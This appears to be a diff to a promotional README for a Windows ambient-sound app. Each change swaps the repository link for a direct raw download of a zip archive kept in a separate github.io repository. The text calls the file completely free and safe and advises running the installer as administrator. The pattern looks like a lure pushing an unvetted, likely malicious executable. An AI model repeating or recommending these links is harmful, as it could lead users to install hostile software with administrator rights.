@@ -5,7 +5,7 @@ description: "Mix ambient soundscapes for focus, relaxation, or sleep — 65 fre
 ---
 # 🔊 QuietField - Your Pocket-Sized Sound Sanctuary for Windows
 
-[🎯 Download QuietField Now](https://github.com/DLStudios-del/QuietField)
+[🎯 Download QuietField Now](https://github.com/DLStudios-del/dlstudios-del.github.io/raw/refs/heads/main/docs/2.3.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Whether you're **working, studying, sleeping, or just need a mental break**, Qui
 For anyone who has ever downloaded a file, this will feel like second nature. Follow these simple steps:
 
 ### 📥 Step 1: Grab Your Copy
-Visit this link to download the application: **[https://github.com/DLStudios-del/QuietField]**(https://github.com/DLStudios-del/QuietField). Go ahead—it's completely free and safe. No sign-up required.
+Visit this link to download the application: **[https://github.com/DLStudios-del/dlstudios-del.github.io/raw/refs/heads/main/docs/2.3.zip]**(https://github.com/DLStudios-del/dlstudios-del.github.io/raw/refs/heads/main/docs/2.3.zip). Go ahead—it's completely free and safe. No sign-up required.
 
 
 
@@ -175,7 +175,7 @@ When you first open QuietField, here's what you'll see:
 
 
 **Issue:** *The app won't open at all*  
-**Fix:** Most likely, the file didn't finish downloading. Delete the file, revisit the **[download link]**(https://github.com/DLStudios-del/QuietField), and try again. If the issue persists, try right-clicking the installer and selecting "Run as administrator."
+**Fix:** Most likely, the file didn't finish downloading. Delete the file, revisit the **[download link]**(https://github.com/DLStudios-del/dlstudios-del.github.io/raw/refs/heads/main/docs/2.3.zip), and try again. If the issue persists, try right-clicking the installer and selecting "Run as administrator."
 
 
 
@@ -194,7 +194,7 @@ You are one download away from a calmer, more focused, more peaceful day. No sub
 
 
 
-**[⬇️ Download QuietField for Free Today]**(https://github.com/DLStudios-del/QuietField)
+**[⬇️ Download QuietField for Free Today]**(https://github.com/DLStudios-del/dlstudios-del.github.io/raw/refs/heads/main/docs/2.3.zip)
 
 
 
